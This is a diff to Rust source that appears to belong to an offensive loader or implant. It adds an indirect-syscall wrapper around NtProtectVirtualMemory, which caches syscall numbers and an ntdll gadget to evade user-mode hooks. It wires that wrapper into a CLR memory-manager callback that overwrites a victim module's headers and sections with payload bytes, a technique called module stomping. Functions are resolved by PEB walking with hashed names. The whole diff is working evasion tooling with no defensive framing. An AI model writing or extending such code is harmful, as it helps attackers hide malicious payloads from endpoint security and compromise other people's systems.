@@ -65,6 +65,56 @@ unsafe fn peb_fn<T>(mod_hash: u32, exp_hash: u32) -> Option<T> {
     }
 }
 
+/// Indirect-syscall `NtProtectVirtualMemory` with userland-VirtualProtect
+/// fallback. Returns true on success (NTSTATUS == 0 or VirtualProtect != 0).
+///
+/// Reads the cached SSN + gadget from `StompPayload` so it works from the
+/// `mm_acquired_vas` CLR callback without a thread-local Bootstrap instance.
+/// When SSN or gadget is zero (Bootstrap::init failed or wasn't run yet),
+/// falls back to PEB-resolved kernel32!VirtualProtect — same behaviour as
+/// pre-hardening builds.
+///
+/// `NtProtectVirtualMemory` requires the in/out base + size pointers to be
+/// writable; we synthesise stack-local copies and discard the post-call values
+/// (mm_acquired_vas does not care about page-aligned-base normalisation).
+unsafe fn vp_indirect(
+    sp: *const StompPayload,
+    addr: *mut c_void,
+    size: usize,
+    new_prot: u32,
+    old_prot: *mut u32,
+) -> bool {
+    unsafe {
+        let ssn = (*sp).nt_vp_ssn;
+        let gadget = (*sp).nt_vp_gadget;
+        if ssn != 0 && gadget != 0 {
+            let process_handle = (-1isize) as *mut c_void; // NtCurrentProcess pseudo-handle
+            let mut base_io = addr;
+            let mut size_io = size;
+            // Inline a minimal Bootstrap-equivalent dispatch: SSN + gadget are
+            // already cached, so we just call indirect_syscall6 with the 6th
+            // arg zeroed (NtProtectVirtualMemory's stub does not read it).
+            let nt_status = opsec_bootstrap::indirect_syscall6(
+                process_handle as usize,
+                core::ptr::addr_of_mut!(base_io) as usize,
+                core::ptr::addr_of_mut!(size_io) as usize,
+                new_prot as usize,
+                old_prot as usize,
+                0,
+                ssn,
+                gadget,
+            );
+            nt_status == 0
+        } else {
+            type VPFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+            match peb_fn::<VPFn>(hash!("kernel32.dll"), hash!("VirtualProtect")) {
+                Some(f) => f(addr, size, new_prot, old_prot) != 0,
+                None => false,
+            }
+        }
+    }
+}
+
 unsafe fn refresh_vtables(objs: *mut HostObjects) {
     unsafe {
         (*objs).hc_vtbl = IHostControlVtbl {
@@ -456,19 +506,14 @@ unsafe extern "system" fn mm_acquired_vas(
         // failures do not silently discard the one chance to stomp.
         core::ptr::write_volatile(&mut (*sp).pending, 0);
 
-        type VPFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
-        let vp: VPFn = match peb_fn(hash!("kernel32.dll"), hash!("VirtualProtect")) {
-            Some(f) => f,
-            None => return S_OK,
-        };
         let mut old_prot: u32 = 0;
 
-        if vp(start_addr, size_of_headers, 0x04, &mut old_prot) == 0 {
+        if !vp_indirect(sp, start_addr, size_of_headers, 0x04, &mut old_prot) {
             return S_OK;
         }
         core::ptr::write_bytes(start_addr as *mut u8, 0, size_of_headers);
         core::ptr::copy_nonoverlapping(payload_bytes, start_addr as *mut u8, size_of_headers);
-        vp(start_addr, size_of_headers, 0x02, &mut old_prot);
+        let _ = vp_indirect(sp, start_addr, size_of_headers, 0x02, &mut old_prot);
 
         let mut ok = true;
         for i in 0..n_sections {
@@ -514,7 +559,7 @@ unsafe extern "system" fn mm_acquired_vas(
             }
 
             let dest = (start_addr as *mut u8).add(va);
-            if vp(dest as *mut c_void, vsz, 0x04, &mut old_prot) == 0 {
+            if !vp_indirect(sp, dest as *mut c_void, vsz, 0x04, &mut old_prot) {
                 ok = false;
                 break;
             }
@@ -524,7 +569,7 @@ unsafe extern "system" fn mm_acquired_vas(
                 core::ptr::copy_nonoverlapping(payload_bytes.add(raw_off), dest, copy_sz);
             }
             let restored_prot = section_prot(chars);
-            vp(dest as *mut c_void, vsz, restored_prot, &mut old_prot);
+            let _ = vp_indirect(sp, dest as *mut c_void, vsz, restored_prot, &mut old_prot);
         }
 
         if ok {
@@ -1093,8 +1138,24 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                 (*sp_raw).payload_size = asm_bytes.len();
                 (*sp_raw).image_size = payload_image_size;
                 (*sp_raw).victim_image_size = usize::MAX; // updated after victim selection
-                (*sp_raw).nt_vp_ssn = 0; // set later in Task 5
-                (*sp_raw).nt_vp_gadget = 0; // set later in Task 5
+                // Bootstrap::init scans ntdll for a syscall;ret gadget and
+                // resolves each NT export's SSN. Cache the NtProtectVirtualMemory
+                // pair on the StompPayload so mm_acquired_vas can call indirect-
+                // syscall directly from the CLR callback without needing a
+                // thread-local Bootstrap instance.
+                //
+                // Bootstrap::init failure is non-fatal — vp_indirect falls
+                // back to PEB-resolved kernel32!VirtualProtect on (0,0).
+                match opsec_bootstrap::Bootstrap::init() {
+                    Ok(b) => {
+                        (*sp_raw).nt_vp_ssn = b.protect_vm_ssn;
+                        (*sp_raw).nt_vp_gadget = b.gadget;
+                    }
+                    Err(_) => {
+                        (*sp_raw).nt_vp_ssn = 0;
+                        (*sp_raw).nt_vp_gadget = 0;
+                    }
+                }
 
                 let mm_raw = global_alloc_zeroed(core::mem::size_of::<MemoryManagerObject>())
                     as *mut MemoryManagerObject;
